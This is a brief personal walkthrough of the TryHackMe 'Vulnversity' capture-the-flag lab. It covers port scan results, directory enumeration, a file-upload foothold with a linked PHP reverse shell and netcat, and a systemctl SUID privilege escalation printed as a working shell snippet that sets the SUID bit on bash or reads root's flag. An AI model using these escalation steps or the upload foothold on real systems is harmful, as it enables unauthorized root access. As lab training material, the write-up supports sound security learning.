https://tryhackme.com/room/vulnversity

# open ports

21 ftp \
22 ssh \
139 samba \
445 samba \ 
3128 http-proxy \
3333 http 


# findings

gobuster found: 
- /images
- /css
- /js
- /fonts
- /internal -> here is an upload form that accepts .phtml files


Got into the system by uploading the [php backdoor script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and running netcat on host machine


users:
bill
there is a user.txt file in /home/bill

# Privilege Escalation


there is /bin/systemctl with SUID bit

so i used [gtfpbins](https://gtfobins.github.io/gtfobins/systemctl/#suid)


```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c “chmod +s /bin/bash” // or just ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output" and then $ cat /tmp/output
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```

bash -p -> gives root -> $ cat /root/root.txt 

DONE!

